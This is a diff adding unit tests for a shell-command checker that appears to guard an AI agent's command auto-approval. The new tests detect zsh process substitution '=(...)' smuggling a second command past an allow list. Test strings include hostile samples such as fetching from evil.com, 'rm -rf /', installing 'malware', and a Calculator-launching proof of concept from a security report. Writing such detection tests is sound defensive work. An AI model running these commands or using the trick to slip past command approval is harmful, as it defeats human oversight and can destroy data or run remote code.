@@ -272,6 +272,26 @@ ls -la || echo "Failed"`
 			expect(containsDangerousSubstitution("sort <<< `pwd`")).toBe(true)
 		})
 
+		it("detects zsh process substitution =() pattern", () => {
+			expect(containsDangerousSubstitution("ls =(open -a Calculator)")).toBe(true)
+
+			// Various forms of zsh process substitution
+			expect(containsDangerousSubstitution("cat =(echo test)")).toBe(true)
+			expect(containsDangerousSubstitution("diff =(ls) =(pwd)")).toBe(true)
+			expect(containsDangerousSubstitution("vim =(curl http://evil.com/script)")).toBe(true)
+			expect(containsDangerousSubstitution("=(whoami)")).toBe(true)
+
+			// Process substitution in middle of command
+			expect(containsDangerousSubstitution("echo test =(date) test")).toBe(true)
+
+			// Multiple process substitutions
+			expect(containsDangerousSubstitution("compare =(cmd1) =(cmd2) =(cmd3)")).toBe(true)
+
+			// Process substitution with complex commands
+			expect(containsDangerousSubstitution("cat =(rm -rf /)")).toBe(true)
+			expect(containsDangerousSubstitution("ls =(sudo apt install malware)")).toBe(true)
+		})
+
 		it("does NOT flag safe parameter expansions", () => {
 			// Regular parameter expansions without dangerous operators
 			expect(containsDangerousSubstitution("echo ${var}")).toBe(false)
@@ -294,6 +314,16 @@ ls -la || echo "Failed"`
 			expect(containsDangerousSubstitution("cat <<<plain_text")).toBe(false)
 			expect(containsDangerousSubstitution('read <<<"static string"')).toBe(false)
 			expect(containsDangerousSubstitution("grep <<<$var")).toBe(false) // Plain variable, not command substitution
+
+			// Safe uses of = without process substitution
+			expect(containsDangerousSubstitution("var=value")).toBe(false)
+			expect(containsDangerousSubstitution("test = test")).toBe(false)
+			expect(containsDangerousSubstitution("if [ $a = $b ]; then")).toBe(false)
+			expect(containsDangerousSubstitution("echo test=value")).toBe(false)
+
+			// Safe comparison operators
+			expect(containsDangerousSubstitution("if [ $a == $b ]; then")).toBe(false)
+			expect(containsDangerousSubstitution("test $x != $y")).toBe(false)
 		})
 
 		it("handles complex combinations of dangerous patterns", () => {
@@ -303,6 +333,9 @@ ls -la || echo "Failed"`
 			expect(containsDangerousSubstitution('echo "${outer=${inner@P}}"')).toBe(true)
 			// Mixed with safe patterns
 			expect(containsDangerousSubstitution("echo ${safe:-default} ${dangerous@P}")).toBe(true)
+			// Zsh process substitution combined with other patterns
+			expect(containsDangerousSubstitution("cat =(whoami) && echo ${var@P}")).toBe(true)
+			expect(containsDangerousSubstitution("ls =(date) <<<$(pwd)")).toBe(true)
 		})
 
 		it("detects the exact exploit from the security report", () => {
@@ -313,6 +346,9 @@ ls -la || echo "Failed"`
 			// Variations of the exploit
 			expect(containsDangerousSubstitution('echo "${x=\\140id\\140}${x@P}"')).toBe(true)
 			expect(containsDangerousSubstitution('result="${cmd=\\x60pwd\\x60}${cmd@P}"')).toBe(true)
+
+			// The new zsh process substitution exploit
+			expect(containsDangerousSubstitution("ls =(open -a Calculator)")).toBe(true)
 		})
 	})
 })
@@ -913,6 +949,21 @@ describe("Unified Command Decision Functions", () => {
 
 				// But if it were a denied command, it would still be denied
 				expect(getCommandDecision(`npm test ${exploit}`, allowedCommands, deniedCommands)).toBe("auto_deny")
+			})
+
+			it("prevents auto-approval for zsh process substitution exploits", () => {
+				// The new zsh process substitution exploit
+				const zshExploit = "ls =(open -a Calculator)"
+				// Even though 'ls' might be allowed, the dangerous pattern prevents auto-approval
+				expect(getCommandDecision(zshExploit, ["ls", "echo"], [])).toBe("ask_user")
+
+				// Various forms should all be blocked
+				expect(getCommandDecision("cat =(whoami)", ["cat"], [])).toBe("ask_user")
+				expect(getCommandDecision("diff =(cmd1) =(cmd2)", ["diff"], [])).toBe("ask_user")
+				expect(getCommandDecision("echo test =(date)", ["echo"], [])).toBe("ask_user")
+
+				// Combined with denied commands
+				expect(getCommandDecision("rm =(echo test)", ["echo"], ["rm"])).toBe("auto_deny")
 			})
 		})
 
